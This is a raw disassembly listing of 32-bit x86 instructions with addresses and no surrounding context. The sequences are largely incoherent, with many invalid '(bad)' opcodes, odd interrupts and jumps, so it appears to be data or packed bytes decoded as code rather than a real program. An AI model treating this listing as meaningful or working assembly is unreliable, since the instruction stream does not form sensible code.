  426ae6:	pop    edi
  426ae7:	leave  
  426ae8:	xor    eax,0xab88080
  426aed:	iret   
  426aee:	add    BYTE PTR [eax],0x0
  426af1:	add    ch,cl
  426af3:	jge    0x426aad
  426af5:	or     cl,bh
  426af7:	aam    0x0
  426af9:	add    BYTE PTR [eax],al
  426afb:	int    0xc5
  426afd:	mov    eax,0xe0060a
  426b02:	add    BYTE PTR [eax],al
  426b04:	cmp    ebp,DWORD PTR [ebp-0x48]
  426b07:	or     ah,BYTE PTR [edi-0x58]
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	add    bh,cl
  426b0e:	addr16 in al,0x0
  426b11:	add    BYTE PTR [eax],al
  426b13:	leave  
  426b14:	push   es
  426b15:	lods   al,BYTE PTR ds:[esi]
  426b16:	add    BYTE PTR [eax],al
  426b18:	add    dh,ah
  426b1a:	xor    eax,0x6c9352b
  426b1f:	fadd   DWORD PTR [eax]
  426b21:	add    BYTE PTR [eax],al
  426b23:	jae    0x426b5a
  426b25:	jno    0x426b5c
  426b27:	mov    eax,0x3076cdaf
  426b2c:	int    0x8d
  426b2e:	xor    ch,cl
  426b30:	xchg   esi,eax
  426b31:	xor    BYTE PTR [edx+eax*1],al
  426b34:	call   ebx
  426b36:	repnz sub BYTE PTR [ebx],bh
  426b39:	jns    0x426b0e
  426b3b:	mov    ebp,0xcdd35392
  426b40:	lea    esi,[eax]
  426b42:	add    al,0x2
  426b44:	(bad)  
  426b45:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426b4b:	repz xchg edx,eax
  426b4d:	push   ebx
  426b4e:	jecxz  0x426b8b
  426b50:	retf   
  426b51:	add    al,0xd2
  426b53:	sbb    bl,BYTE PTR [ebx]
  426b55:	retf   
  426b56:	cmp    eax,DWORD PTR [eax]
  426b58:	inc    ebx
  426b59:	cli    
  426b5a:	das    
  426b5b:	or     cl,dl
  426b5d:	add    BYTE PTR [eax+0x43888280],0xd2
  426b64:	das    
  426b65:	add    al,0x37
  426b67:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426b6e:	xchg   esi,eax
  426b6f:	xor    BYTE PTR [ebx],bh
  426b71:	psrlq  mm5,mm3
  426b74:	xchg   edx,eax
  426b75:	add    al,0xfb
  426b77:	call   ebx
  426b79:	jmp    0xcd7d:0x87135328
  426b80:	aad    0xb8
  426b82:	cmp    edx,DWORD PTR ds:0x708d
  426b88:	add    ch,cl
  426b8a:	lea    esi,[eax]
  426b8c:	int    0xe6
  426b8e:	xor    BYTE PTR [ebx],bh
  426b90:	psrlq  mm5,mm3
  426b93:	xchg   edx,eax
  426b94:	add    al,0xf8
  426b96:	call   ebx
  426b98:	jmp    0x8832bec5
  426b9d:	jge    0x426b57
  426b9f:	int    0xcc
  426ba1:	lea    esi,[eax+0x0]
  426ba4:	add    BYTE PTR [eax],al
  426ba6:	mov    eax,0xd3b8e3f8
  426bab:	repnz das 
  426bad:	mov    eax,0x53b8f3e3
  426bb2:	jecxz  0x426b81
  426bb4:	lea    esi,[eax]
  426bb6:	int    0xe6
  426bb8:	xor    BYTE PTR [ebx],bh
  426bba:	psrlq  mm5,mm3
  426bbd:	xchg   edx,eax
  426bbe:	add    al,0xf8
  426bc0:	call   ebx
  426bc2:	jmp    0x8832beef
  426bc7:	jge    0x426b81
  426bc9:	or     dl,BYTE PTR ds:0x708d
  426bcf:	add    ch,cl
  426bd1:	lea    esi,[eax]
  426bd3:	int    0x96
  426bd5:	xor    BYTE PTR [ebx],bh
  426bd7:	(bad)  
  426bd9:	sti    
  426bda:	call   ebx
  426bdc:	jmp    0x426b70
  426bde:	shr    edx,cl
  426be0:	sub    BYTE PTR [ebx+0x13],dl
  426be3:	int    0x96
  426be5:	xor    BYTE PTR [edi+0x308dcdd3],al
  426beb:	add    al,0x2
  426bed:	(bad)  
  426bee:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426bf4:	repz xchg edx,eax
  426bf6:	push   ebx
  426bf7:	jecxz  0x426c34
  426bf9:	retf   
  426bfa:	add    al,0xd2
  426bfc:	sbb    bl,BYTE PTR [ebx]
  426bfe:	retf   
  426bff:	cmp    eax,DWORD PTR [eax]
  426c01:	inc    ebx
  426c02:	cli    
  426c03:	das    
  426c04:	or     ebp,DWORD PTR [esi+0x2f000000]
  426c0a:	pop    es
  426c0b:	pop    ebx
  426c0c:	add    BYTE PTR [eax],al
  426c0e:	add    bl,al
  426c10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c11:	mov    esi,0x76cf4229
  426c16:	jne    0x426c22
  426c18:	jbe    0x426ba2
  426c1a:	int    0x76
  426c1c:	mov    BYTE PTR [edi+0x13de37b6],bh
  426c22:	or     bl,BYTE PTR [ecx+ecx*8]
  426c25:	ins    BYTE PTR es:[edi],dx
  426c26:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426c2c:	jbe    0x426ca3
  426c2e:	int    0x8d
  426c30:	jge    0x426c61
  426c32:	inc    ebp
  426c33:	jge    0x426bc7
  426c35:	shr    ebx,cl
  426c37:	xchg   edx,eax
  426c38:	int    0x8d
  426c3a:	jne    0x426c09
  426c3c:	xchg   esi,eax
  426c3d:	jge    0x426c7a
  426c3f:	leave  
  426c40:	cmp    ebx,edx
  426c42:	push   ebx
  426c43:	icebp  
  426c44:	int    0x76
  426c46:	cmc    
  426c47:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426c4d:	jo     0x426c1e
  426c4f:	push   es
  426c50:	cmc    
  426c51:	inc    DWORD PTR [eax]
  426c53:	add    BYTE PTR [eax-0x2d],dh
  426c56:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c5d:	int    0x76
  426c5f:	in     eax,dx
  426c60:	int    0x8d
  426c62:	adc    DWORD PTR [edi],ebp
  426c64:	inc    ebp
  426c65:	jge    0x426bf9
  426c67:	shr    ebx,cl
  426c69:	xchg   edx,eax
  426c6a:	int    0x8d
  426c6c:	in     eax,dx
  426c6d:	int    0x96
  426c6f:	adc    ebx,edx
  426c71:	repnz sub ch,cl
  426c74:	iret   
  426c75:	cmc    
  426c76:	inc    DWORD PTR [eax]
  426c78:	add    ch,cl
  426c7a:	mov    DWORD PTR [ebx],edi
  426c7c:	leave  
  426c7d:	cmp    ebx,edx
  426c7f:	push   ebx
  426c80:	rol    BYTE PTR [ebx+0x7d],cl
  426c83:	das    
  426c84:	push   es
  426c85:	push   ebp
  426c86:	add    BYTE PTR [eax-0xa293280],0xc9
  426c8d:	jbe    0x426c9c
  426c8f:	(bad)  
  426c90:	ficom  WORD PTR ss:[ebx]
  426c93:	pop    ebp
  426c94:	mov    ebp,0xa25230a
  426c99:	jbe    0x426c8c
  426c9b:	or     ah,BYTE PTR [esi-0x6289f56b]
  426ca1:	int    0x76
  426ca3:	xchg   ebp,eax
  426ca4:	int    0x8d
  426ca6:	popf   
  426ca7:	das    
  426ca8:	inc    ebp
  426ca9:	jge    0x426c3d
  426cab:	shr    ebx,cl
  426cad:	xchg   edx,eax
  426cae:	int    0x8d
  426cb0:	xchg   ebp,eax
  426cb1:	int    0x96
  426cb3:	popf   
  426cb4:	cmp    ecx,ecx
  426cb6:	cmp    ebx,edx
  426cb8:	push   ebx
  426cb9:	icebp  
  426cba:	bound  eax,QWORD PTR [eax]
  426cbc:	(bad)  
  426cbd:	xor    al,0xd3
  426cbf:	repnz sub BYTE PTR [eax],al
  426cc2:	pop    ecx
  426cc3:	xor    eax,0xbd808081
  426cc8:	push   eax
  426cc9:	repnz add BYTE PTR [eax],al
  426ccc:	int    0x76
  426cce:	xchg   ebp,eax
  426ccf:	int    0x8d
  426cd1:	popf   
  426cd2:	das    
  426cd3:	inc    ebp
  426cd4:	jge    0x426c68
  426cd6:	shr    ebx,cl
  426cd8:	xchg   edx,eax
  426cd9:	int    0x8d
  426cdb:	xchg   ebp,eax
  426cdc:	int    0x96
  426cde:	popf   
  426cdf:	cmp    ecx,ecx
  426ce1:	cmp    ebx,edx
  426ce3:	push   ebx
  426ce4:	icebp  
  426ce5:	bound  eax,QWORD PTR [eax]
  426ce7:	pop    ecx
  426ce8:	xor    eax,0xd3808081
  426ced:	repnz sub BYTE PTR [eax],al
  426cf0:	pop    ecx
  426cf1:	sub    eax,0xbd808081
  426cf6:	xchg   edx,eax
  426cf7:	repnz add BYTE PTR [eax],al
  426cfa:	int    0x7
  426cfc:	xor    eax,0xcd808081
  426d01:	mov    ch,cl
  426d03:	jle    0x426d69
  426d05:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426d0b:	lea    ecx,ds:0x2ff176cd
  426d11:	inc    ebp
  426d12:	rcl    DWORD PTR [edx-0x326d422d],cl
  426d18:	jbe    0x426d27
  426d1a:	int    0x96
  426d1c:	icebp  
  426d1d:	cmp    esi,eax
  426d1f:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426d25:	ror    ebp,cl
  426d27:	lea    ecx,[eax+0x187ebb2f]
  426d2d:	push   es
  426d2e:	jge    0x426d04
  426d30:	dec    esp
  426d31:	int    0x7
  426d33:	popf   
  426d34:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426d3e:	jbe    0x426d8c
  426d40:	int    0x76
  426d42:	xor    BYTE PTR [eax],al
  426d44:	(bad)  
  426d45:	cmp    al,0x0
  426d47:	(bad)  
  426d48:	cmc    
  426d49:	add    dh,dl
  426d4b:	sub    al,0x0
  426d4d:	(bad)  
  426d4e:	and    al,0x0
  426d50:	(bad)  
  426d51:	sbb    al,0x0
  426d53:	(bad)  
  426d54:	adc    al,0xbd
  426d56:	test   ch,dh
  426d58:	add    BYTE PTR [eax],al
  426d5a:	or     al,BYTE PTR [esi]
  426d5c:	adc    edi,edi
  426d5e:	add    BYTE PTR [eax],al
  426d60:	int    0x76
  426d62:	cmp    al,0x4
  426d64:	fcom   QWORD PTR [eax+eax*4]
  426d67:	aam    0x1a
  426d69:	int    0x76
  426d6b:	cmp    al,0x4
  426d6d:	fsub   QWORD PTR [eax+eax*4]
  426d70:	aam    0x4e
  426d72:	int    0x6
  426d74:	adc    edi,edi
  426d76:	add    BYTE PTR [eax],al
  426d78:	int    0x8d
  426d7a:	cmp    al,0xa
  426d7c:	outs   dx,BYTE PTR ds:[esi]
  426d7d:	sbb    al,0xec
  426d7f:	push   ebx
  426d80:	add    dh,dl
  426d82:	cmp    al,0x0
  426d84:	(bad)  
  426d85:	cmc    
  426d86:	mov    ebp,0x6daa
  426d8b:	stos   BYTE PTR es:[edi],al
  426d8c:	test   al,0x63
  426d8e:	retf   
  426d8f:	shl    BYTE PTR [eax+eax*4],cl
  426d92:	xchg   esi,eax
  426d93:	int    0xed
  426d95:	jno    0x426e08
  426d97:	cwde   
  426d98:	leave  
  426d99:	jbe    0x426d98
  426d9b:	dec    ecx
  426d9c:	and    DWORD PTR [esi-0x68936cb],eax
  426da2:	inc    ecx
  426da3:	and    DWORD PTR [esi-0x28932cb],eax
  426da9:	int    0xd6
  426dab:	std    
  426dac:	sar    bh,0x5f
  426daf:	shl    DWORD PTR [ecx],1
  426db1:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426db7:	sti    
  426db8:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426dbe:	push   ebx
  426dbf:	jns    0x426d8e
  426dc1:	(bad)  
  426dc2:	mov    BYTE PTR [ebx+0x11],al
  426dc5:	int    0x76
  426dc7:	std    
  426dc8:	aam    0xc4
  426dca:	int    0xd6
  426dcc:	std    
  426dcd:	cmp    edx,ebx
  426dcf:	cmp    edi,ebx
  426dd1:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426dd7:	push   ebx
  426dd8:	jns    0x426da7
  426dda:	(bad)  
  426ddb:	dec    esp
  426ddc:	inc    ebx
  426ddd:	adc    esp,edx
  426ddf:	pop    ebx
  426de0:	int    0x96
  426de2:	xor    BYTE PTR [edx-0x32b31933],bl
  426de8:	jbe    0x426d72
  426dea:	cmp    esi,edi
  426dec:	push   es
  426ded:	add    ah,dl
  426def:	push   esi
  426df0:	pop    ebx
  426df1:	retf   0x8624
  426df4:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426dfa:	das    
  426dfb:	push   es
  426dfc:	fcmovbe st,st(6)
  426dfe:	dec    esi
  426dff:	add    al,0xf4
  426e01:	adc    DWORD PTR [edx],0xffffffc5
  426e04:	fwait
  426e05:	add    BYTE PTR [eax+0x2fa60980],0xec
  426e0c:	dec    esp
  426e0d:	adc    ch,ah
  426e0f:	in     eax,dx
  426e10:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426e17:	lea    ebp,[edi]
  426e19:	retf   0x2fa6
  426e1c:	or     DWORD PTR [esi+eax*4],esp
  426e1f:	js     0x426e64
  426e21:	clc    
  426e22:	or     BYTE PTR [esi],0x63
  426e25:	int    0x76
  426e27:	stc    
  426e28:	cmp    edx,ebx
  426e2a:	int    0x8d
  426e2c:	stc    
  426e2d:	add    al,0x2
  426e2f:	jmp    FWORD PTR [edx+0x76cd4aec]
  426e35:	std    
  426e36:	cmp    edx,ebx
  426e38:	int    0x8d
  426e3a:	std    
  426e3b:	cmp    edx,DWORD PTR [ebx]
  426e3d:	shl    edx,cl
  426e3f:	sub    bl,dl
  426e41:	mov    ebp,0xa8d35392
  426e46:	retf   
  426e47:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426e4b:	int    0xed
  426e4d:	add    al,0xed
  426e4f:	(bad)  
  426e50:	leave  
  426e51:	jbe    0x426e50
  426e53:	dec    ecx
  426e54:	and    DWORD PTR [esi+0x21416135],eax
  426e5a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426e60:	jbe    0x426e76
  426e62:	or     dh,BYTE PTR [esi+0x14]
  426e65:	int    0x76
  426e67:	adc    al,0xcd
  426e69:	add    DWORD PTR ds:0xcd808081,ebp
  426e6f:	lea    edx,[ecx*8+0x2d0acd80]
  426e76:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426e80:	lea    esi,[ebp-0x32028933]
  426e86:	(bad)  
  426e87:	std    
  426e88:	cwde   
  426e89:	call   0x3b85:0x82cfffc0
  426e90:	jns    0x426e65
  426e92:	mov    ebp,0xf03baa92
  426e97:	shl    edx,cl
  426e99:	sub    BYTE PTR [ebx-0x2d],dl
  426e9c:	or     dh,BYTE PTR [esi-0x63]
  426e9f:	int    0x76
  426ea1:	std    
  426ea2:	int    0x8d
  426ea4:	std    
  426ea5:	cmp    edi,DWORD PTR [ecx-0x2d]
  426ea8:	mov    ebp,0xd3f03b92
  426ead:	repnz sub BYTE PTR [ebx-0x2d],dl
  426eb1:	or     dh,BYTE PTR [esi-0x53]
  426eb4:	int    0x76
  426eb6:	mov    ch,0xcd
  426eb8:	ins    BYTE PTR es:[edi],dx
  426eb9:	jo     0x426ebf
  426ebb:	mov    ebp,0xf1760a4c
  426ec0:	int    0x76
  426ec2:	mov    ch,0xcd
  426ec4:	ins    BYTE PTR es:[edi],dx
  426ec5:	pop    esp
  426ec6:	int    0x8d
  426ec8:	mov    ch,0x7c
  426eca:	push   es
  426ecb:	outs   dx,BYTE PTR ds:[esi]
  426ecc:	xchg   esp,eax
  426ecd:	int    0x76
  426ecf:	mov    ch,0xd4
  426ed1:	sbb    al,0xcd
  426ed3:	ins    BYTE PTR es:[edi],dx
  426ed4:	pop    esp
  426ed5:	int    0x8d
  426ed7:	mov    ch,0xcd
  426ed9:	jle    0x426e6f
  426edb:	jl     0x426ed5
  426edd:	icebp  
  426ede:	sub    edi,DWORD PTR [ebp-0x33]
  426ee1:	jbe    0x426e98
  426ee3:	int    0x6c
  426ee5:	pop    esp
  426ee6:	xchg   ebx,edx
  426ee8:	in     al,dx
  426ee9:	xchg   ebp,ecx
  426eeb:	ins    BYTE PTR es:[edi],dx
  426eec:	xchg   esp,eax
  426eed:	or     dh,BYTE PTR [esi-0x43]
  426ef0:	int    0x76
  426ef2:	std    
  426ef3:	int    0x8d
  426ef5:	std    
  426ef6:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ef9:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f00:	push   ebx
  426f01:	ror    DWORD PTR [edx],cl
  426f03:	jbe    0x426f19
  426f05:	int    0x76
  426f07:	std    
  426f08:	int    0x8d
  426f0a:	std    
  426f0b:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f0e:	lock shl edx,cl
  426f11:	sub    bl,dl
  426f13:	mov    ebp,0xad35392
  426f18:	jbe    0x426f2e
  426f1a:	int    0x76
  426f1c:	std    
  426f1d:	int    0x8d
  426f1f:	std    
  426f20:	cmp    esi,eax
  426f22:	cmp    edi,DWORD PTR [ecx-0x2d]
  426f25:	repnz sub bl,dl
  426f28:	mov    ebp,0xcdd35392
  426f2d:	lea    esi,[eax]
  426f2f:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426f35:	jbe    0x426f4b
  426f37:	cmp    DWORD PTR [ecx],esp
  426f39:	xchg   BYTE PTR ds:0xb21476c9,dh
  426f3f:	and    DWORD PTR [esi+0x1476c935],eax
  426f45:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426f4b:	xchg   BYTE PTR [eax-0x2893280],al
  426f51:	int    0x8d
  426f53:	std    
  426f54:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f57:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f5e:	push   ebx
  426f5f:	ror    DWORD PTR [edx],cl
  426f61:	jbe    0x426f10
  426f63:	int    0x76
  426f65:	mov    ebp,0xa4c7687
  426f6a:	jbe    0x426f09
  426f6c:	add    dh,dl
  426f6e:	popf   
  426f6f:	add    dh,dl
  426f71:	dec    esp
  426f72:	int    0x8d
  426f74:	mov    ch,0xbd
  426f76:	neg    bh
  426f78:	add    BYTE PTR [eax],al
  426f7a:	or     dh,BYTE PTR [esi+0x14]
  426f7d:	int    0x76
  426f7f:	adc    al,0x6
  426f81:	ins    DWORD PTR es:[edi],dx
  426f82:	aam    0x60
  426f84:	int    0x76
  426f86:	popf   
  426f87:	or     dh,BYTE PTR [esi-0x5b]
  426f8a:	int    0x76
  426f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f8d:	int    0x8d
  426f8f:	dec    esp
  426f90:	xor    edx,ebx
  426f92:	or     dh,BYTE PTR [esi-0x5b]
  426f95:	int    0x76
  426f97:	adc    al,0xcd
  426f99:	lea    edx,[ecx*8+0x6e87306c]
  426fa0:	dec    esp
  426fa1:	int    0x8d
  426fa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fa4:	inc    ebx
  426fa5:	jge    0x426f29
  426fa7:	sbb    ch,cl
  426fa9:	jbe    0x426fbf
  426fab:	int    0x6c
  426fad:	dec    esp
  426fae:	int    0x8d
  426fb0:	adc    al,0x87
  426fb2:	outs   dx,BYTE PTR ds:[esi]
  426fb3:	mov    ch,cl
  426fb5:	lea    esp,[ebp-0x2e142ccd]
  426fbb:	test   DWORD PTR [eax+0x2149bf80],eax
  426fc1:	xchg   BYTE PTR ds:0xc90da60a,dh
  426fc7:	jbe    0x427046
  426fc9:	inc    ecx
  426fca:	and    DWORD PTR [esi+0x7576c935],eax
  426fd0:	cmp    DWORD PTR [ecx],esp
  426fd2:	xchg   BYTE PTR ds:0xb26d76c9,dh
  426fd8:	and    DWORD PTR [esi+0xd76cf35],eax
  426fde:	or     dh,BYTE PTR [esi-0xb]
  426fe1:	iret   
  426fe2:	jbe    0x427061
  426fe4:	or     dh,BYTE PTR [esi+0x11]
  426fe7:	iret   
  426fe8:	jbe    0x42705f
  426fea:	or     dh,BYTE PTR [esi+0x14]
  426fed:	iret   
  426fee:	jbe    0x42705d
  426ff0:	or     dh,BYTE PTR [esi-0x13]
  426ff3:	int    0x76
  426ff5:	std    
  426ff6:	int    0x8d
  426ff8:	std    
  426ff9:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ffc:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427003:	push   ebx
  427004:	ror    DWORD PTR [edx],cl
  427006:	jbe    0x426fad
  427008:	jmp    0x42701d
  42700a:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  427010:	and    DWORD PTR [esi-0x22fad0cb],eax
  427016:	xchg   DWORD PTR [eax+0x4cc080],eax
  42701c:	(bad)  
  42701d:	popf   
  42701e:	iret   
  42701f:	jbe    0x426ff1
  427021:	jo     0x426fe0
  427023:	xlat   BYTE PTR ds:[ebx]
  427024:	fild   WORD PTR [eax]
  427026:	add    ch,cl
  427028:	jbe    0x427023
  42702a:	int    0x8d
  42702c:	stc    
  42702d:	cmp    edi,DWORD PTR [ecx+0x3b]
  427030:	lock shl edx,cl
  427033:	sub    bl,dl
  427035:	mov    ebp,0xad35392
  42703a:	jbe    0x426fe9
  42703c:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  427042:	int    0x76
  427044:	xchg   ebp,eax
  427045:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  42704b:	in     eax,0x28
  42704d:	push   ebx
  42704e:	popf   
  42704f:	or     ah,BYTE PTR [esi-0x689325b]
  427055:	int    0x8d
  427057:	stc    
  427058:	cmp    esi,eax
  42705a:	shl    edx,cl
  42705c:	sub    BYTE PTR [ebx],bh
  42705e:	jns    0x427033
  427060:	mov    ebp,0xcdd35392
  427065:	(bad)  
  427066:	stc    
  427067:	int    0x96
  427069:	stc    
  42706a:	cmp    ecx,DWORD PTR [edi]
  42706c:	cmp    ebx,ecx
  42706e:	shr    ebx,cl
  427070:	xchg   edx,eax
  427071:	shr    edx,cl
  427073:	sub    BYTE PTR [ebx+0x13],dl
  427076:	xchg   ebx,edx
  427078:	int    0x8d
  42707a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42707b:	or     ah,BYTE PTR [esi-0x2982bc9b]
  427081:	sub    ch,cl
  427083:	jbe    0x42707e
  427085:	int    0x8d
  427087:	stc    
  427088:	cmp    edi,DWORD PTR [ecx+0x3b]
  42708b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427092:	push   ebx
  427093:	shl    DWORD PTR [eax-0x40],cl
  427096:	dec    esp
  427097:	iret   
  427098:	jbe    0x42706a
  42709a:	jo     0x427059
  42709c:	sti    
  42709d:	std    
  42709e:	add    BYTE PTR [eax],al
  4270a0:	int    0x76
  4270a2:	std    
  4270a3:	int    0x8d
  4270a5:	std    
  4270a6:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270a9:	lock shl edx,cl
  4270ac:	sub    bl,dl
  4270ae:	mov    ebp,0xcdd35392
  4270b3:	lea    esp,[ebp+0x28d47d43]
  4270b9:	int    0x76
  4270bb:	std    
  4270bc:	int    0x8d
  4270be:	std    
  4270bf:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270c2:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4270c9:	push   ebx
  4270ca:	shl    DWORD PTR [eax-0x40],cl
  4270cd:	dec    esp
  4270ce:	iret   
  4270cf:	jbe    0x4270a1
  4270d1:	jo     0x427090
  4270d3:	mov    edi,0xcd0000fd
  4270d8:	jbe    0x4270cf
  4270da:	int    0x8d
  4270dc:	cmc    
  4270dd:	int    0x89
  4270df:	int    0x80
  4270e1:	cmp    esi,eax
  4270e3:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270e6:	repnz sub bl,dl
  4270e9:	mov    ebp,0xcad35392
  4270ee:	je     0x427075
  4270f0:	ror    ch,1
  4270f2:	(bad)  
  4270f3:	std    
  4270f4:	int    0x96
  4270f6:	std    
  4270f7:	cmp    ecx,DWORD PTR [edi]
  4270f9:	cmp    ebx,ecx
  4270fb:	shr    ebx,cl
  4270fd:	xchg   edx,eax
  4270fe:	shr    edx,cl
  427100:	sub    BYTE PTR [edi],ch
  427102:	pop    ecx
  427103:	ins    DWORD PTR es:[edi],dx
  427104:	push   ebx
  427105:	adc    eax,DWORD PTR [ebx-0x2d]
  427108:	das    
  427109:	add    eax,0x80809212
  42710e:	int    0x76
  427110:	adc    ebp,ecx
  427112:	lea    edx,[ecx]
  427114:	int    0x89
  427116:	int    0x80
  427118:	cmp    esi,eax
  42711a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42711d:	repnz sub bl,dl
  427120:	mov    ebp,0xcad35392
  427125:	je     0x4270ac
  427127:	ror    ch,1
  427129:	(bad)  
  42712a:	std    
  42712b:	int    0x96
  42712d:	std    
  42712e:	cmp    ecx,DWORD PTR [edi]
  427130:	cmp    ebx,ecx
  427132:	shr    ebx,cl
  427134:	xchg   edx,eax
  427135:	shr    edx,cl
  427137:	sub    BYTE PTR [edi],ch
  427139:	pop    ecx
  42713a:	ins    DWORD PTR es:[edi],dx
  42713b:	push   ebx
  42713c:	adc    eax,DWORD PTR [ebx-0x2d]
  42713f:	das    
  427140:	add    eax,0x8080928a
  427145:	int    0x76
  427147:	adc    al,0xcd
  427149:	lea    edx,[ecx*8+0x3b80cd89]
  427150:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427154:	repnz sub bl,dl
  427157:	mov    ebp,0xcad35392
  42715c:	je     0x4270e3
  42715e:	ror    ch,1
  427160:	(bad)  
  427161:	std    
  427162:	int    0x96
  427164:	std    
  427165:	cmp    ecx,DWORD PTR [edi]
  427167:	cmp    ebx,ecx
  427169:	shr    ebx,cl
  42716b:	xchg   edx,eax
  42716c:	shr    edx,cl
  42716e:	sub    BYTE PTR [edi],ch
  427170:	pop    ecx
  427171:	ins    DWORD PTR es:[edi],dx
  427172:	push   ebx
  427173:	adc    eax,DWORD PTR [ebx-0x2d]
  427176:	das    
  427177:	add    eax,0x8080921b
  42717c:	int    0x76
  42717e:	in     eax,dx
  42717f:	int    0x8d
  427181:	in     eax,dx
  427182:	int    0x89
  427184:	int    0x80
  427186:	cmp    esi,eax
  427188:	cmp    edi,DWORD PTR [ecx-0x2d]
  42718b:	repnz sub bl,dl
  42718e:	mov    ebp,0xcad35392
  427193:	je     0x42711a
  427195:	ror    ch,1
  427197:	(bad)  
  427198:	std    
  427199:	int    0x96
  42719b:	std    
  42719c:	cmp    ecx,DWORD PTR [edi]
  42719e:	cmp    ebx,ecx
  4271a0:	shr    ebx,cl
  4271a2:	xchg   edx,eax
  4271a3:	shr    edx,cl
  4271a5:	sub    BYTE PTR [edi],ch
  4271a7:	pop    ecx
  4271a8:	ins    DWORD PTR es:[edi],dx
  4271a9:	push   ebx
  4271aa:	adc    eax,DWORD PTR [ebx-0x2d]
  4271ad:	das    
  4271ae:	add    eax,0x808081a5
  4271b3:	int    0x76
  4271b5:	adc    ebp,ecx
  4271b7:	lea    edx,[ecx]
  4271b9:	int    0x89
  4271bb:	int    0x80
  4271bd:	cmp    esi,eax
  4271bf:	shl    edx,cl
  4271c1:	sub    BYTE PTR [ebx],bh
  4271c3:	jns    0x427198
  4271c5:	mov    ebp,0xcad35392
  4271ca:	je     0x427151
  4271cc:	ror    ch,1
  4271ce:	(bad)  
  4271cf:	cmc    
  4271d0:	int    0x89
  4271d2:	int    0x96
  4271d4:	cmc    
  4271d5:	int    0x22
  4271d7:	cmp    ecx,DWORD PTR [edi]
  4271d9:	shr    ebx,cl
  4271db:	xchg   edx,eax
  4271dc:	cmp    ebx,ecx
  4271de:	shr    edx,cl
  4271e0:	sub    BYTE PTR [ebx+0x13],dl
  4271e3:	retf   0x4d8c
  4271e6:	rol    BYTE PTR [edx-0x2d],1
  4271e9:	int    0x8d
  4271eb:	adc    al,0xcd
  4271ed:	mov    ebp,ecx
  4271ef:	xchg   esi,eax
  4271f0:	adc    al,0xcd
  4271f2:	and    bh,BYTE PTR [ebx]
  4271f4:	psrlq  mm5,mm3
  4271f7:	xchg   edx,eax
  4271f8:	cmp    ebx,ecx
  4271fa:	shr    edx,cl
  4271fc:	sub    BYTE PTR [ebx+0x13],dl
  4271ff:	retf   0x4d8c
  427202:	ror    BYTE PTR [edx-0x2d],1
  427205:	int    0x8d
  427207:	cmc    
  427208:	int    0x89
  42720a:	int    0x96
  42720c:	cmc    
  42720d:	int    0x22
  42720f:	cmp    ecx,DWORD PTR [edi]
  427211:	cmp    ebx,ecx
  427213:	shr    ebx,cl
  427215:	xchg   edx,eax
  427216:	shr    edx,cl
  427218:	sub    BYTE PTR [ebx+0x13],dl
  42721b:	retf   0x4d8c
  42721e:	push   ebp
  42721f:	pusha  
  427220:	jge    0x427251
  427222:	push   es
  427223:	mov    esp,0xcd808081
  427228:	jbe    0x42723e
  42722a:	int    0x8d
  42722c:	adc    al,0xcd
  42722e:	mov    ebp,ecx
  427230:	cmp    BYTE PTR [ebx],0xf0
  427233:	shl    edx,cl
  427235:	sub    BYTE PTR [ebx],bh
  427237:	jns    0x42720c
  427239:	mov    ebp,0xcad35392
  42723e:	je     0x4271c5
  427240:	ror    ch,1
  427242:	lea    edx,[ecx]
  427244:	int    0x89
  427246:	int    0x96
  427248:	adc    ebp,ecx
  42724a:	and    bh,BYTE PTR [ebx]
  42724c:	psrlq  mm5,mm3
  42724f:	xchg   edx,eax
  427250:	cmp    ebx,ecx
  427252:	shr    edx,cl
  427254:	sub    BYTE PTR [ebx+0x13],dl
  427257:	retf   0x4d8c
  42725a:	rol    BYTE PTR [edx-0x2d],1
  42725d:	int    0x8d
  42725f:	in     eax,dx
  427260:	int    0x89
  427262:	int    0x96
  427264:	in     eax,dx
  427265:	int    0x22
  427267:	cmp    ecx,DWORD PTR [edi]
  427269:	shr    ebx,cl
  42726b:	xchg   edx,eax
  42726c:	cmp    ebx,ecx
  42726e:	shr    edx,cl
  427270:	sub    BYTE PTR [ebx+0x13],dl
  427273:	retf   0x4d8c
  427276:	ror    BYTE PTR [edx-0x2d],1
  427279:	int    0x8d
  42727b:	adc    ebp,ecx
  42727d:	mov    ebp,ecx
  42727f:	xchg   esi,eax
  427280:	adc    ebp,ecx
